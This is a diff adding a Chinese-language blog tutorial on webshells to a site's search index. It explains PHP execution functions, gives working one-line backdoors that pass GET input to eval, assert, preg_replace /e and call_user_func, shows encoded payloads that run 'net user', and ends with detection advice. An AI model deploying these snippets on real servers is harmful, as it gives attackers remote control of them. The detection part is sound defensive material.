@@ -5597,4 +5597,78 @@
         <tag>内网渗透</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Webshell</title>
+    <url>/2020/12/27/Webshell/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+<h1 id="什么是Webshell"><a href="#什么是Webshell" class="headerlink" title="什么是Webshell"></a>什么是Webshell</h1><p><strong>百度定义：</strong></p>
+<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
+<p>常见的webshell编写语言为asp、jsp和php。</p>
+<h1 id="webshell的作用"><a href="#webshell的作用" class="headerlink" title="webshell的作用"></a>webshell的作用</h1><h2 id="持久化访问"><a href="#持久化访问" class="headerlink" title="持久化访问"></a>持久化访问</h2><p>Webshell脚本通常会包含后门，黑客上传Webshell之后，就可以充分利用Webshell的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在服务器没有配置错误的情况下，Webshell将在web服务器的用户权限下运行，而用户权限是有限的。通过Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得Root权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p>
+<h1 id="Webshell常用的PHP函数"><a href="#Webshell常用的PHP函数" class="headerlink" title="Webshell常用的PHP函数"></a>Webshell常用的PHP函数</h1><p>Webshell几乎适用于所有Web编程语言。之所以关注PHP，是因为它是web上使用最广泛的编程语言。下面是PHP中一些执行shell命令最常用的函数。</p>
+<h2 id="OS命令执行函数"><a href="#OS命令执行函数" class="headerlink" title="OS命令执行函数"></a>OS命令执行函数</h2><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>system()函数将命令作为参数，并输出结果。</p>
+<p>如在Windows操作系统上运行dir命令：</p>
+<p><img src="/2020/12/27/Webshell/image-20201227230933926.png" alt="image-20201227230933926"></p>
+<p>在Linux机器上执行ls命令：</p>
+<p><img src="/2020/12/27/Webshell/image-20201227231016159.png" alt="image-20201227231016159"></p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>exec() 函数能将字符串作为OS 命令执行。</p>
+<p><img src="/2020/12/27/Webshell/image-20201227231346947.png" alt="image-20201227231346947"></p>
+<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>将函数中的参数当做OS 命令执行。</p>
+<p><img src="/2020/12/27/Webshell/image-20201227231438954.png" alt="image-20201227231438954"></p>
+<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>将字符串当做系统命令执行。</p>
+<p><img src="/2020/12/27/Webshell/image-20201227231521547.png" alt="image-20201227231521547"></p>
+<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>popen() 能够执行OS 命令。此函数没有回显，但是可以执行命令。</p>
+<p><img src="/2020/12/27/Webshell/image-20201227231651751.png" alt="image-20201227231651751"></p>
+<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>反引号<code></code> 内的字符串，也会被解析成OS 命令。</p>
+<p><img src="/2020/12/27/Webshell/image-20201227231730163.png" alt="image-20201227231730163"></p>
+<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval() 会将符合PHP 语法规范字符串当作php 代码执行。</p>
+<p>虽然可以以函数的方式调用eval()，但是eval() 不是PHP 的函数，而是一种语法结构。在eval() 执行的的字符串要以分号结束。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;phpinfo();</span><br><span class="line">&#x2F;&#x2F;$str &#x3D; &quot;phpinfo();&quot;;</span><br><span class="line">&#x2F;&#x2F;echo $str;</span><br><span class="line">$str &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">eval($str);</span><br><span class="line">&#x2F;&#x2F;      ?code&#x3D;phinfo();</span><br><span class="line">&#x2F;&#x2F;      ?code&#x3D;print(md5(123456));</span><br><span class="line">&#x2F;&#x2F;      ?code&#x3D;system(whoami);</span><br><span class="line">&#x2F;&#x2F;      ?code&#x3D;system(&#39;net user&#39;);</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">?&gt;</span><br><span class="line">$str &#x3D; addslashes($_GET[&#39;code&#39;]);</span><br><span class="line">echo $str;</span><br><span class="line">eval($str);</span><br><span class="line">&#x2F;*</span><br><span class="line">编码</span><br><span class="line">1. ascii 编码</span><br><span class="line">?code&#x3D;eval(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(39).chr(110).chr(101).chr(116).chr(32).chr(117).chr(115).chr(101).chr(114).chr(39).chr(41).chr(59));</span><br><span class="line">​</span><br><span class="line">2. base64 编码</span><br><span class="line">c3lzdGVtKCduZXQgdXNlcicpOw&#x3D;&#x3D;</span><br><span class="line">?code&#x3D;eval(base64_decode(c3lzdGVtKCduZXQgdXNlcicpOw));</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
+<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>assert() 同样会将字符串当做PHP 代码来执行。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Please submit code!&lt;br &#x2F;&gt;?code&#x3D;phpinfo()&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() 函数的作用是对字符串进行正则匹配后替换。</p>
+<p>参数和返回值如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace($pattern,$replacement,$subject);</span><br><span class="line">preg_replace(&#39;&#x2F;a&#x2F;&#39;,&#39;A&#39;,&#39;abacad&#39;);						&#x2F;&#x2F;AbAcAd</span><br><span class="line">preg_replace(&#39;&#x2F;\[(.*)\]&#x2F;&#39;,&#39;A&#39;,&#39;[phpinfo()]&#39;);			&#x2F;&#x2F;A</span><br><span class="line">echo preg_replace(&#39;&#x2F;\[(.*)\]&#x2F;&#39;,&#39;\\1&#39;,&#39;[phpinfo()]&#39;);	&#x2F;&#x2F;phpinfo()</span><br><span class="line">&#x2F;&#x2F;	\\1:代表正则表达式第一次匹配的内容</span><br></pre></td></tr></table></figure>
+<p>搜索$subject 中匹配$pattern 的部分，以$replacement 进行替换。</p>
+<p>当$pattern 处，存在e 修饰符时，$replacement 的值会被当成PHP 代码来执行。</p>
+<p>执行的代码中的参数会被转义。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    preg_replace(&quot;&#x2F;\[(.*)\]&#x2F;e&quot;,&#39;\\1&#39;, $code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo&quot;?code&#x3D;[phpinfo()]&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>call_user_func() 等函数都有调用其他函数的功能，回调函数。</p>
+<p><img src="/2020/12/27/Webshell/image-20201227232549639.png" alt="image-20201227232549639"></p>
+<p>$funName 被调用的函数名。</p>
+<p>$para 作为被调用函数的参数，参数中的单引号没有被转义。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;fun&#39;]))&#123;</span><br><span class="line">    $fun&#x3D;$_GET[&#39;fun&#39;];</span><br><span class="line">    $para&#x3D;$_GET[&#39;para&#39;];</span><br><span class="line">    call_user_func($fun,$para);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo&quot;?fun&#x3D;assert&amp;para&#x3D;phpinfo()&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="动态函数-a-b"><a href="#动态函数-a-b" class="headerlink" title="动态函数$a($b)"></a>动态函数$a($b)</h4><p>由于PHP 的特性原因，PHP 的函数支持直接由拼接的方式调用，这直接导致了PHP 在安全上的控制有加大了难度。不少知名程序中也用到了动态函数的写法，这种写法跟使用call_user_func()的初衷一样，用来更加方便地调用函数，但是一旦过了不严格就会造成代码执行漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;</span><br><span class="line">    $a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">    $b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">    $a($b);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;</span><br><span class="line">    ?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br><span class="line">    &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h1><h1 id="Webshell客户端"><a href="#Webshell客户端" class="headerlink" title="Webshell客户端"></a>Webshell客户端</h1><h2 id="客户端与服务端"><a href="#客户端与服务端" class="headerlink" title="客户端与服务端"></a>客户端与服务端</h2><p>提供服务的就是服务端,要求被服务的就是客户端。如果已经种了后门,用于连接后门的程序是要求被服务的,比如执行个ps,目的是为了得到后门所在主机的进程列表,是“被服务“的,所以称之为客户端。</p>
+<p>WebShell客户端是一种用于与服务器上WebShell后门之间进行通信的程序。如今国内外常用的WebShell客户端有如下几种：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">中国菜刀(使用量最大,适用范围最广的WebShell客户端)</span><br><span class="line"></span><br><span class="line">蚁剑(一种常用的WebShell客户端)</span><br><span class="line"></span><br><span class="line">冰蝎(流量加密客户端)</span><br><span class="line"></span><br><span class="line">Cknife(C刀,使用Java语言编写)</span><br><span class="line"></span><br><span class="line">哥斯拉(基于流量、HTTP全加密的webshell管理工具)</span><br><span class="line"></span><br><span class="line">Weevely(kali中的中国菜刀)</span><br></pre></td></tr></table></figure>
+<h2 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h2><h2 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h2><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><h1 id="Webshell检测"><a href="#Webshell检测" class="headerlink" title="Webshell检测"></a>Webshell检测</h1><h2 id="应急响应检测"><a href="#应急响应检测" class="headerlink" title="应急响应检测"></a>应急响应检测</h2><p>即使是一款拥有99.9%的Webshell检出率的检测引擎，依然可能存在Webshell绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽SEO手法，也很难通过手动检测或工具检测全部识别出来。</p>
+<h4 id="文件MD5校验"><a href="#文件MD5校验" class="headerlink" title="文件MD5校验"></a>文件MD5校验</h4><p>当用户下载软件时，可以使用相同的校验算法计算下载到exe文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的exe文件是正确的。如果两个特征值不同，则认为下载到exe文件是被篡改过的。</p>
+<p>那同理可得，我们可以将所有网站文件计算一次hash值保存，当出现应急情况时，重新计算一次hash值，并与上次保存的hash值进行对比，从而输出新创建的、修改过及删除的文件列表。</p>
+<h4 id="diff命令"><a href="#diff命令" class="headerlink" title="diff命令"></a>diff命令</h4><p>在linux中，我们经常使用diff来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff -c -a -r cms1 cms2  &#x2F;&#x2F;想查看两个文件是否不同又不想显示差异之处，加上－q选项。</span><br></pre></td></tr></table></figure>
+<h4 id="版本控制工具"><a href="#版本控制工具" class="headerlink" title="版本控制工具"></a>版本控制工具</h4><p>版本控制工具，比如说git，重新上传代码到git，add+commit+push，然后打开项目，点击commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p>
+<h4 id="文件对比工具"><a href="#文件对比工具" class="headerlink" title="文件对比工具"></a>文件对比工具</h4><p>Beyond Compare是一套由Scooter Software推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p>
+<p>下载地址：<a href="http://www.scootersoftware.com/download.php" target="_blank" rel="noopener">http://www.scootersoftware.com/download.php</a></p>
+<p>WinMerge是一款运行于Windows系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p>
+<p>下载地址：<a href="https://winmerge.org/downloads/" target="_blank" rel="noopener">https://winmerge.org/downloads/</a></p>
+<h2 id="NSA检测"><a href="#NSA检测" class="headerlink" title="NSA检测"></a>NSA检测</h2><p>美国国家安全局（NSA）和澳大利亚信号局（ASD）联合发布了一份有关缓解WebShell后门的网络安全信息表（CSI）。</p>
+<p>NSA发布在Github的检测工具和脚本:</p>
+<p><a href="https://github.com/nsacyber/Mitigating-Web-Shells" target="_blank" rel="noopener">https://github.com/nsacyber/Mitigating-Web-Shells</a></p>
+<p>检测规则涉及文件层的Yara，网络层的Snort规则，日志类的Splunk，目录检测文件比对等等，加入库中，直接拥有了美国NSA级别的检测能力。</p>
+<p><img src="/2020/12/27/Webshell/image-20201227234744591.png" alt="image-20201227234744591"></p>
+<p>NSA发布在Github的检测工具和脚本:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、由于Webshell经常伪装成图片进行上传，因此可以将这些伪装的图片和知名的图片进行比较。</span><br><span class="line"></span><br><span class="line">2、Splunk查询，用于检测Web流量中的异常URL</span><br><span class="line"></span><br><span class="line">3、Internet信息服务（IIS）日志分析工具</span><br><span class="line"></span><br><span class="line">4、常见Web Shell的网络流量签名</span><br><span class="line"></span><br><span class="line">5、识别异常网络流量的说明</span><br><span class="line"></span><br><span class="line">6、识别Sysmon数据中关于Webshell相关的异常流程调用</span><br><span class="line"></span><br><span class="line">7、使用Audited识别异常流程调用的说明</span><br><span class="line"></span><br><span class="line">8、用于阻止对可通过Web访问的目录的更改的HIPS规则</span><br></pre></td></tr></table></figure>
+<p>从Github介绍可知，很是全面。</p>
+]]></content>
+      <categories>
+        <category>横贯八方</category>
+      </categories>
+      <tags>
+        <tag>横贯八方</tag>
+      </tags>
+  </entry>
 </search>
